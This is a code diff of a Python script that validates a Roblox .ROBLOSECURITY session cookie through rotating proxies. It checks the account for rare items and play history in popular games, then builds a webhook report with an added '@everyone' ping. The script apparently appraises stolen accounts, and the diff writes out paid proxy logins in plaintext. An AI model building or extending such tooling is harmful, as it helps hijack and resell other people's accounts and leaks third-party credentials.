@@ -6,19 +6,28 @@ import random
 import requests
 from datetime import datetime, timezone
 
-# --- Reduced Fast Proxy List ---
-RAW_PROXY_LIST = """
-socks5://192.111.130.5:17002
-socks5://45.74.31.40:15662
-socks5://47.238.128.246:18080
-socks5://45.74.31.41:17812
-socks5://8.220.136.174:1081
-socks5://47.91.89.3:139
-socks5://45.74.31.40:16595
-socks5://45.74.31.47:7059
-socks5://8.220.204.92:30001
-socks5://45.74.31.41:15628
-"""
+# --- Updated Proxy List ---
+RAW_WEBSHARE_PROXIES = [
+    "45.38.107.97:6014:saxqnmup:rgvs7uvqydbm",
+    "64.137.96.74:6641:saxqnmup:rgvs7uvqydbm",
+    "198.23.243.226:6361:saxqnmup:rgvs7uvqydbm",
+    "38.154.185.97:6370:saxqnmup:rgvs7uvqydbm",
+    "84.247.60.125:6095:saxqnmup:rgvs7uvqydbm",
+    "191.96.254.138:6185:saxqnmup:rgvs7uvqydbm",
+    "198.46.161.42:5092:saxqnmup:rgvs7uvqydbm",
+    "64.137.10.153:5803:saxqnmup:rgvs7uvqydbm",
+    "104.164.49.38:7693:saxqnmup:rgvs7uvqydbm",
+    "23.26.71.145:5628:saxqnmup:rgvs7uvqydbm"
+]
+
+def format_webshare(p_str):
+    parts = p_str.strip().split(':')
+    if len(parts) == 4:
+        ip, port, user, pwd = parts
+        return f"http://{user}:{pwd}@{ip}:{port}"
+    return None
+
+PROXIES_TO_TRY = [format_webshare(p) for p in RAW_WEBSHARE_PROXIES if format_webshare(p)]
 
 SPECIAL_ASSETS = {
     "Korblox": 139607718,
@@ -70,18 +79,19 @@ def get_working_session(roblosecurity):
     })
 
     manual_proxy = os.environ.get('PROXY_URL')
-    proxies_to_try = [manual_proxy] if manual_proxy else []
-    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
-    random.shuffle(parsed_proxies)
-    proxies_to_try.extend(parsed_proxies)
+    test_proxies = [manual_proxy] if manual_proxy else []
+    
+    shuffled_proxies = list(PROXIES_TO_TRY)
+    random.shuffle(shuffled_proxies)
+    test_proxies.extend(shuffled_proxies)
 
-    for p in proxies_to_try:
+    for p in test_proxies:
         if not p:
             continue
         proxy_dict = {"http": p, "https": p}
         try:
             session.proxies = proxy_dict
-            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=3)
+            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=4)
             if test_res.status_code == 200:
                 return session
         except Exception:
@@ -220,13 +230,14 @@ def main():
                     played = True
         return played, 0
 
-    adopt_played, adopt_passes = check_played_and_passes(383310974)
-    mm2_played, mm2_passes = check_played_and_passes(142823291)
-    ps99_played, ps99_passes = check_played_and_passes(3259657279)
+    adopt_played, _ = check_played_and_passes(383310974)
+    mm2_played, _ = check_played_and_passes(142823291)
+    ps99_played, _ = check_played_and_passes(3259657279)
 
     avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
 
     payload = {
+        "content": "@everyone",
         "username": f"{username} | Stats",
         "avatar_url": avatar_url,
         "embeds": [
